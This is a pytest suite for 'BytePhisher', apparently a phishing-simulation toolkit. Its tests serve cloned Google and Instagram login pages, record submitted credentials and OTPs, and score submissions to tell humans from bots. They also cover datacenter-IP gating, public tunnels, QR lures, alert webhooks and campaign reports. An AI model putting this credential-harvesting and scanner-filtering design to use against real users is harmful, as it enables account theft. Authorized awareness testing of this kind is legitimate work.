"""BytePhisher advanced-feature tests: risk scoring, QR, campaign report,
template rotation, alerts payloads — everything beyond the core capture path.

Run:  ./.venv/bin/python -m pytest tests/test_features.py -v
"""
import json
import os
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request

import pytest

from conftest import TEMPLATES, free_port

from core import server as srv
from core import capture as cap
from core import risk
from core import links
import mailer

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PY = sys.executable


# ============================================================ risk engine ====
class TestRiskEngine:
    def test_clean_human_submission_is_low_risk(self):
        s, r = risk.score({"email": "a@b.com", "password": "x", "_ts": "9000"},
                          ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                             "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
                          isp="Airtel Broadband", device="windows", country="India",
                          city="Delhi")
        assert s < 30 and r == [], (s, r)

    def test_datacenter_ip_is_flagged(self):
        s, r = risk.score({"email": "a@b.com", "password": "x"},
                          ua="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
                          isp="OVH SAS", device="linux")
        assert s >= 30 and any("datacenter" in x for x in r), (s, r)

    def test_automation_user_agent_is_flagged(self):
        for ua in ("curl/8.4.0", "python-requests/2.31", "Mozilla/5.0 (compatible; Googlebot/2.1)",
                   "", "Go-http-client/1.1"):
            s, r = risk.score({"email": "a", "password": "b"}, ua=ua)
            assert any("user-agent" in x for x in r) or any("automation" in x for x in r), (ua, r)

    def test_honeypot_fill_is_flagged(self):
        s, r = risk.score({"email": "a", "password": "b", "hp_email": "bot@example.com"},
                          ua="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/124 Safari/537.36")
        assert s >= 40 and any("honeypot" in x for x in r)

    def test_instant_submit_is_flagged(self):
        s, r = risk.score({"email": "a", "password": "b", "_ts": "120"},
                          ua="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 Chrome/124 Safari/537.36")
        assert any("fast" in x for x in r)

    def test_score_is_capped_at_100(self):
        s, r = risk.score({"email": "a", "password": "b", "hp_email": "x", "_ts": "50"},
                          ua="curl/8.0", isp="OVH SAS", device="unknown")
        assert s == 100 and len(r) >= 4

    def test_level_thresholds(self):
        assert risk.level(0) == "low" and risk.level(29) == "low"
        assert risk.level(30) == "medium" and risk.level(69) == "medium"
        assert risk.level(70) == "high" and risk.level(100) == "high"

    def test_is_likely_human(self):
        assert risk.is_likely_human({"is_cred": True, "risk": 10}) is True
        assert risk.is_likely_human({"is_cred": True, "risk": 80}) is False
        assert risk.is_likely_human({"is_cred": False, "risk": 0}) is False

    def test_score_handles_none_values(self):
        s, r = risk.score(None, ua=None, isp=None, device=None, country=None, city=None)
        assert isinstance(s, int) and isinstance(r, list)


class TestRiskThroughHTTP:
    def _serve(self):
        dbp = os.path.join(tempfile.mkdtemp(), "risk.db")
        port = free_port()
        httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, dbp,
                             geo_provider="off", campaign="risk")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        return httpd, dbp, port

    def _post(self, port, data, ua):
        req = urllib.request.Request(
            f"http://127.0.0.1:{port}/", data=urllib.parse.urlencode(data).encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": ua})
        return urllib.request.urlopen(req, timeout=10).status

    def test_bot_traffic_gets_high_risk_and_human_low(self):
        httpd, dbp, port = self._serve()
        try:
            self._post(port, {"email": "bot@example.com", "password": "x"}, "curl/8.4.0")
            self._post(port, {"email": "human@example.com", "password": "y", "_ts": "9400"},
                       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
            time.sleep(0.4)
            db = cap.CaptureDB(dbp)
            rows = {r["fields"]["email"]: r for r in db.all()}
            assert rows["bot@example.com"]["risk"] >= 40
            assert rows["bot@example.com"]["risk_reasons"]
            assert rows["human@example.com"]["risk"] < 30
            st = db.stats()
            assert st["credentials"] == 2 and st["credible_credentials"] == 1
            db.close()
        finally:
            httpd.shutdown()


# ================================================================== QR =======
class TestQR:
    def test_qr_png_is_written_and_valid(self):
        out = os.path.join(tempfile.mkdtemp(), "qr.png")
        path = links.qr_png("https://example.trycloudflare.com/", path=out)
        if path is None:
            pytest.skip("segno not installed")
        assert os.path.isfile(path)
        with open(path, "rb") as f:
            head = f.read(8)
        assert head == b"\x89PNG\r\n\x1a\n"          # real PNG magic
        assert os.path.getsize(path) > 200

    def test_qr_ascii_preview(self):
        pytest.importorskip("segno")
        art = links.qr_ascii("https://example.trycloudflare.com/")
        assert art and len(art) > 50          # must RETURN the art, not print it
        assert "█" in art or "#" in art or "▀" in art or "▄" in art

    def test_qr_svg(self):
        out = os.path.join(tempfile.mkdtemp(), "qr.svg")
        path = links.qr_svg("https://x.example.com/", path=out)
        if path is None:
            pytest.skip("segno not installed")
        assert "<svg" in open(path).read()[:400]


# ============================================================== report =======
class TestReport:
    @pytest.fixture()
    def populated_db(self):
        path = os.path.join(tempfile.mkdtemp(), "rep.db")
        db = cap.CaptureDB(path)
        db.record("/", "203.0.113.5", "Mumbai", "India", "Jio", "UA-browser", "android",
                  {"email": "a@corp.com", "password": "p1", "_ts": "9000"}, True,
                  campaign="q3-payroll", risk=0, risk_reasons=[])
        db.record("/", "198.51.100.9", "London", "United Kingdom", "OVH SAS", "curl/8",
                  "linux", {"email": "b@corp.com", "password": "p2"}, True,
                  campaign="q3-payroll", risk=75, risk_reasons=["automation signature in user-agent (curl/)"])
        db.record("/otp", "203.0.113.5", "Mumbai", "India", "Jio", "UA-browser", "android",
                  {"otp_1": "1"}, False, campaign="q3-payroll", risk=0)
        db.record("/", "203.0.113.6", "Pune", "India", "Airtel", "UA-browser", "ios",
                  {"email": "c@corp.com", "password": "p3"}, True, campaign="q4-invoice", risk=0)
        yield path, db
        db.close()

    def test_report_written_and_self_contained(self, populated_db):
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "report.html")
        from tools.report import build_report
        res = build_report(path, out)
        html = open(out).read()
        assert res["rows"] == 4
        assert "<title>" in html and "BytePhisher" in html
        # no external resources: a client can open it offline
        assert "http://" not in html.split("<style>")[0]
        assert not re.search(r'<(script|link)[^>]+https?://', html)
        # content checks
        assert "q3-payroll" in html and "q4-invoice" in html
        assert "Credible" in html
        assert "Mumbai" in html and "a@corp.com" in html
        assert "high (75)" in html

    def test_report_campaign_filter(self, populated_db):
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "q4.html")
        from tools.report import build_report
        res = build_report(path, out, campaign="q4-invoice")
        html = open(out).read()
        assert res["rows"] == 1
        assert "c@corp.com" in html and "a@corp.com" not in html

    def test_report_with_qr(self, populated_db):
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "qrrep.html")
        from tools.report import build_report
        try:
            import segno  # noqa: F401
        except ImportError:
            pytest.skip("segno not installed")
        build_report(path, out, qr_url="https://example.com/phish")
        html = open(out).read()
        assert "campaign_qr.png" in html and os.path.isfile(
            os.path.join(os.path.dirname(out), "campaign_qr.png"))

    def test_report_escapes_html_in_fields(self, populated_db):
        path, db = populated_db
        db.record("/", "1.2.3.4", "", "", "", "UA", "ios",
                  {"email": "<script>alert(1)</script>", "password": "x"}, True,
                  campaign="xss", risk=0)
        out = os.path.join(tempfile.mkdtemp(), "xss.html")
        from tools.report import build_report
        build_report(path, out)
        html = open(out).read()
        assert "<script>alert(1)</script>" not in html
        assert "&lt;script&gt;alert(1)&lt;/script&gt;" in html

    def test_cli_report_flag(self, populated_db):
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "cli.html")
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--report", out],
                           cwd=HERE, capture_output=True, text=True, timeout=90)
        assert p.returncode == 0, p.stdout + p.stderr
        assert "report written" in p.stdout and os.path.isfile(out)


# ============================================================ rotation =======
class TestTemplateRotation:
    def test_rotation_serves_multiple_templates(self):
        dbp = os.path.join(tempfile.mkdtemp(), "rot.db")
        port = free_port()
        dirs = [os.path.join(TEMPLATES, f"0{i}_google") for i in (1, 2)]
        dirs = [os.path.join(TEMPLATES, "03_google"), os.path.join(TEMPLATES, "02_instagram")]
        httpd, _ = srv.serve(TEMPLATES, dirs[0], port, dbp, geo_provider="off",
                             rotate_dirs=dirs, campaign="ab-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            seen = set()
            for _ in range(40):
                body = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read().decode()
                seen.add("Google" if "Google" in body else "Instagram" if "Instagram" in body else "?")
            assert seen == {"Google", "Instagram"}, seen
        finally:
            httpd.shutdown()

    def test_rotation_captures_carry_tpl_field(self):
        dbp = os.path.join(tempfile.mkdtemp(), "rot2.db")
        port = free_port()
        dirs = [os.path.join(TEMPLATES, "03_google"), os.path.join(TEMPLATES, "02_instagram")]
        httpd, _ = srv.serve(TEMPLATES, dirs[0], port, dbp, geo_provider="off",
                             rotate_dirs=dirs, campaign="ab-test")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            for _ in range(6):
                urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read()
            req = urllib.request.Request(
                f"http://127.0.0.1:{port}/",
                data=urllib.parse.urlencode({"username": "ab", "password": "x",
                                             "_tpl": "instagram"}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (iPhone) AppleWebKit/605.1.15"})
            urllib.request.urlopen(req, timeout=10).read()
            time.sleep(0.4)
            db = cap.CaptureDB(dbp)
            rows = db.all()
            assert rows and rows[0]["fields"]["_tpl"] == "instagram"
            assert rows[0]["campaign"] == "ab-test"
            db.close()
        finally:
            httpd.shutdown()


# ============================================================== alerts =======
class TestAlertPayloads:
    def test_payload_carries_campaign_and_risk(self):
        from conftest import StubHTTP
        from core.alerts import make_notifier
        stub = StubHTTP()
        try:
            dbp = os.path.join(tempfile.mkdtemp(), "al.db")
            port = free_port()
            httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, dbp,
                                 geo_provider="off", campaign="mailer-campaign",
                                 site_name="google",
                                 on_capture=make_notifier(webhook=stub.url, async_=False))
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
            time.sleep(0.3)
            try:
                req = urllib.request.Request(
                    f"http://127.0.0.1:{port}/",
                    data=urllib.parse.urlencode({"email": "alert@corp.com", "password": "pw",
                                                 "_ts": "8000"}).encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 "
                                            "Chrome/124 Safari/537.36"})
                urllib.request.urlopen(req, timeout=10).read()
                time.sleep(0.5)
                assert len(stub.received) == 1
                cap_ = json.loads(stub.received[0]["body"])["capture"]
                assert cap_["campaign"] == "mailer-campaign"
                # geo_provider="off" costs the "no geo resolution" penalty (+5)
                assert cap_["risk"] <= 10
                assert cap_["risk_reasons"] == ["no geo resolution"]
                assert "risk" in stub.received[0]["body"].decode()
            finally:
                httpd.shutdown()
        finally:
            stub.stop()

    def test_format_capture_shows_risk_line(self):
        from core import alerts
        text = alerts.format_capture({
            "ts": 1, "campaign": "c1", "ip": "9.9.9.9", "device": "linux",
            "is_cred": True, "risk": 75,
            "risk_reasons": ["automation signature in user-agent (curl/)"],
            "fields": {"email": "a@b.c", "password": "x"}})
        assert "campaign : c1" in text
        assert "risk     : 75/100 (high)" in text
        assert "automation signature" in text


# ================================================================= CLI =======
class TestNewCLIFlags:
    def test_help_lists_new_flags(self):
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--help"],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        out = p.stdout
        for flag in ("--telegram", "--webhook", "--mailto", "--campaign", "--qr",
                     "--report", "--rotate"):
            assert flag in out, flag

    def test_qr_flag_generates_file(self):
        out = os.path.join(tempfile.mkdtemp(), "cli_qr.png")
        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
                                 "-o", "google", "-m", "test", "-p", str(free_port()),
                                 "--no-tui", "--geo", "off", "--qr", out],
                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            deadline = time.time() + 30
            buf = ""
            while time.time() < deadline and "QR code" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "QR code" in buf, buf
            assert os.path.isfile(out)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()

    def test_import_site_cli(self, tmp_path):
        p = subprocess.run([PY, os.path.join(HERE, "tools", "import_site.py"),
                            "--file", os.path.join("tests", "fixtures", "custom_login.html"),
                            "--name", "CLI Import", "--slug", "cli-import-cli"],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        assert p.returncode == 0, p.stdout + p.stderr
        assert "imported ->" in p.stdout
        # clean up the template we just added to the real library
        man = json.load(open(os.path.join(TEMPLATES, "templates.json")))
        entry = [t for t in man if t["slug"] == "cli-import-cli"]
        if entry:
            import shutil
            shutil.rmtree(entry[0]["dir"], ignore_errors=True)
            man = [t for t in man if t["slug"] != "cli-import-cli"]
            json.dump(man, open(os.path.join(TEMPLATES, "templates.json"), "w"), indent=2)

    def test_cli_rotate_flag_in_local_mode(self):
        port = free_port()
        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
                                 "-o", "google", "--rotate", "google,instagram",
                                 "-m", "test", "-p", str(port), "--no-tui", "--geo", "off"],
                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            buf = ""
            deadline = time.time() + 30
            while time.time() < deadline and "server up" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "rotating" in buf and "server up" in buf, buf
            seen = set()
            for _ in range(30):
                body = urllib.request.urlopen(f"http://127.0.0.1:{port}/", timeout=10).read().decode()
                seen.add("Google" if "Google" in body else "Instagram")
            assert seen == {"Google", "Instagram"}
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except Exception:
                proc.kill()


# ========================================================== pdf report =======
class TestPDFReport:
    @pytest.fixture()
    def populated_db(self):
        path = os.path.join(tempfile.mkdtemp(), "pdf.db")
        db = cap.CaptureDB(path)
        db.record("/", "203.0.113.5", "Mumbai", "India", "Jio", "UA", "android",
                  {"email": "human@corp.com", "password": "p1", "_ts": "9000"}, True,
                  campaign="q3-payroll", risk=0, risk_reasons=[])
        db.record("/", "198.51.100.9", "Frankfurt", "Germany", "Hetzner", "curl/8",
                  "linux", {"email": "bot@corp.com", "password": "p2"}, True,
                  campaign="q3-payroll", risk=75,
                  risk_reasons=["automation signature in user-agent (curl/)"])
        db.record("/otp", "203.0.113.5", "Mumbai", "India", "Jio", "UA", "android",
                  {"otp_1": "1", "otp_2": "2"}, False, campaign="q3-payroll", risk=0)
        db.log_blocked("198.51.100.1", "RU", "datacenter network (OVH SAS)")
        yield path, db
        db.close()

    def test_pdf_written_with_expected_content(self, populated_db):
        pytest.importorskip("reportlab")
        from pypdf import PdfReader
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "r.pdf")
        from tools.report_pdf import build_report_pdf
        res = build_report_pdf(path, out, title="Test campaign")
        assert os.path.isfile(out) and os.path.getsize(out) > 2000
        assert res["pages"] >= 3, res
        assert res["rows"] == 3
        text = "\n".join((p.extract_text() or "") for p in PdfReader(out).pages)
        for needle in ("SUBMISSIONS", "CREDENTIAL PAIRS", "CREDIBLE", "Test campaign",
                       "Geography", "Devices", "Timeline", "Gated out",
                       "datacenter network (OVH SAS)"):
            assert needle in text, needle
        # evidence labels: one human credential, one automated credential, one OTP
        assert "CONFIRMED" in text and "SUSPECTED" in text and "OTP ONLY" in text
        # the captured addresses are present, and nothing is over-claimed
        assert "human@corp.com" in text and "bot@corp.com" in text
        assert "victim" not in text.lower()

    def test_pdf_campaign_filter(self, populated_db):
        pytest.importorskip("reportlab")
        from pypdf import PdfReader
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "q3.pdf")
        from tools.report_pdf import build_report_pdf
        res = build_report_pdf(path, out, campaign="q3-payroll")
        text = "\n".join((p.extract_text() or "") for p in PdfReader(out).pages)
        assert res["rows"] == 3 and "human@corp.com" in text

    def test_pdf_with_qr(self, populated_db):
        pytest.importorskip("reportlab")
        pytest.importorskip("segno")
        path, _db = populated_db
        out = os.path.join(tempfile.mkdtemp(), "qr.pdf")
        from tools.report_pdf import build_report_pdf
        build_report_pdf(path, out, qr_url="https://example.trycloudflare.com/")
        assert os.path.isfile(os.path.join(os.path.dirname(out), "campaign_qr.png"))

    def test_pdf_empty_db_does_not_crash(self):
        pytest.importorskip("reportlab")
        path = os.path.join(tempfile.mkdtemp(), "empty.db")
        cap.CaptureDB(path).close()
        out = os.path.join(tempfile.mkdtemp(), "empty.pdf")
        from tools.report_pdf import build_report_pdf
        res = build_report_pdf(path, out)
        assert res["rows"] == 0 and res["pages"] >= 1 and os.path.getsize(out) > 1000

    def test_cli_pdf_flag(self, populated_db):
        pytest.importorskip("reportlab")
        out = os.path.join(tempfile.mkdtemp(), "cli.pdf")
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--pdf", out],
                           cwd=HERE, capture_output=True, text=True, timeout=120)
        assert p.returncode == 0, p.stdout + p.stderr
        assert "pdf written" in p.stdout and os.path.isfile(out)


# ========================================================== data export ======
class TestDataExport:
    def test_json_export_written_and_parseable(self):
        path = os.path.join(tempfile.mkdtemp(), "exp.db")
        db = cap.CaptureDB(path)
        db.record("/", "203.0.113.7", "Berlin", "Germany", "Hetzner", "UA", "linux",
                  {"email": "json@corp.com", "password": "p"}, True,
                  campaign="jsoncamp", risk=40, risk_reasons=["datacenter/hosting network"])
        out = os.path.join(tempfile.mkdtemp(), "out.json")
        db.export_json(out)
        data = json.load(open(out))
        assert data["stats"]["total_captures"] == 1
        assert data["campaigns"][0]["campaign"] == "jsoncamp"
        assert data["captures"][0]["risk"] == 40
        assert data["captures"][0]["fields"]["email"] == "json@corp.com"
        db.close()

    def test_cli_export_json_by_extension(self):
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"),
                            "--export", os.path.join(tempfile.mkdtemp(), "x.json")],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        assert p.returncode == 0 and "(json)" in p.stdout

    def test_cli_export_csv_by_extension(self):
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"),
                            "--export", os.path.join(tempfile.mkdtemp(), "x.csv")],
                           cwd=HERE, capture_output=True, text=True, timeout=60)
        assert p.returncode == 0 and "(csv)" in p.stdout


# ============================================================= stress ========
class TestStressTool:
    def test_stress_runs_against_local_server_and_counts_rows(self):
        from core import server as _srv
        dbp = os.path.join(tempfile.mkdtemp(), "stress.db")
        port = free_port()
        httpd, _ = _srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, dbp,
                              geo_provider="off", campaign="stress")
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)
        try:
            p = subprocess.run([PY, os.path.join(HERE, "tools", "stress.py"),
                                "--port", str(port), "--concurrency", "10", "--total", "120",
                                "--mix", "--db", dbp],
                               cwd=HERE, capture_output=True, text=True, timeout=180)
            out = p.stdout
            assert p.returncode == 0, out + p.stderr
            assert "http 200      : 120" in out, out
            assert "throughput" in out and "latency p95" in out
            db = cap.CaptureDB(dbp)
            assert db.stats()["total_captures"] == 120        # no lost writes
            db.close()
        finally:
            httpd.shutdown()


# ============================================================= doctor ========
class TestDoctor:
    def test_doctor_json_reports_real_environment(self):
        p = subprocess.run([PY, os.path.join(HERE, "tools", "doctor.py"), "--json"],
                           cwd=HERE, capture_output=True, text=True, timeout=90)
        data = json.loads(p.stdout)
        assert data["checks"], "doctor produced no checks"
        names = {c["check"] for c in data["checks"]}
        for must in ("python", "sqlite", "templates", "data dir writable", "config"):
            assert must in names, names
        tpl = [c for c in data["checks"] if c["check"] == "templates"][0]
        assert tpl["status"] == "ok" and "registered" in tpl["detail"]
        assert data["failures"] == 0, [c for c in data["checks"] if c["status"] == "fail"]
        assert p.returncode == 0

    def test_cli_doctor_flag(self):
        p = subprocess.run([PY, os.path.join(HERE, "bytephisher.py"), "--doctor"],
                           cwd=HERE, capture_output=True, text=True, timeout=90)
        assert "ok, " in p.stdout and "failures" in p.stdout, p.stdout[-400:]
        assert p.returncode == 0


# ==================================================== tunnel watchdog ========
class TestTunnelWatchdog:
    """Kill the tunnel process mid-run and prove the CLI warns about it."""

    def test_cli_warns_when_tunneler_dies(self):
        import signal as _signal
        import socket as _socket
        try:
            _socket.create_connection(("1.1.1.1", 443), timeout=4).close()
        except Exception:
            pytest.skip("no outbound network")
        port = free_port()
        proc = subprocess.Popen([PY, os.path.join(HERE, "bytephisher.py"),
                                 "-o", "google", "-t", "localhost_run", "-p", str(port),
                                 "-m", "normal", "--no-tui", "--geo", "off"],
                                cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            buf = ""
            deadline = time.time() + 60
            while time.time() < deadline and "lhr.life" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            if "lhr.life" not in buf:
                pytest.skip("localhost.run did not produce a URL in time")

            # kill the ssh tunnel process behind the CLI's back
            killed = subprocess.run(["pkill", "-f", "nokey@localhost.run"],
                                    capture_output=True, text=True)
            if killed.returncode != 0:
                pytest.skip("could not find the ssh tunnel process to kill")

            # the watchdog runs every ~10s in the plain loop
            deadline = time.time() + 40
            while time.time() < deadline and "WARNING: tunneler" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "WARNING: tunneler" in buf, buf[-600:]
            assert "localhost_run" in buf.split("WARNING: tunneler")[1][:60]
        finally:
            if proc.poll() is None:
                proc.send_signal(_signal.SIGINT)
                try:
                    proc.communicate(timeout=25)
                except Exception:
                    proc.kill()


# ==================================================== campaign launcher ======
class TestCampaignLauncher:
    """tools/campaign.sh: preflight -> run -> auto report/CSV on exit."""

    def test_launcher_runs_reports_and_exports(self):
        import signal as _signal
        camp = f"launcher-test-{int(time.time())}"
        port = free_port()
        proc = subprocess.Popen(
            ["bash", os.path.join(HERE, "tools", "campaign.sh"), "google", camp, "none"],
            cwd=HERE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        try:
            buf = ""
            deadline = time.time() + 90
            while time.time() < deadline and "server up" not in buf:
                line = proc.stdout.readline()
                if not line:
                    break
                buf += line
            assert "preflight" in buf, buf
            assert "server up" in buf, buf
            # drive one capture through it
            req = urllib.request.Request(
                f"http://127.0.0.1:8080/",
                data=urllib.parse.urlencode({"email": "launcher@example.com",
                                             "password": "L1!", "_ts": "7000"}).encode(),
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 "
                                        "Chrome/124 Safari/537.36"})
            urllib.request.urlopen(req, timeout=10).read()
            time.sleep(1.0)
            proc.send_signal(_signal.SIGINT)
            rest, _ = proc.communicate(timeout=60)
            out = buf + rest
            assert "writing outputs" in out, out[-500:]
            report = os.path.join(HERE, "data", f"report-{camp}.html")
            csvf = os.path.join(HERE, "data", f"captures-{camp}.csv")
            assert os.path.isfile(report) and os.path.getsize(report) > 1000
            assert os.path.isfile(csvf)
            html = open(report).read()
            assert camp in html
            assert "launcher@example.com" in open(csvf).read()
        finally:
            if proc.poll() is None:
                proc.kill()
            for f in (os.path.join(HERE, "data", f"report-{camp}.html"),
                      os.path.join(HERE, "data", f"captures-{camp}.csv"),
                      os.path.join(HERE, "data", f"qr-{camp}.png")):
                if os.path.isfile(f):
                    os.remove(f)
        _ = port
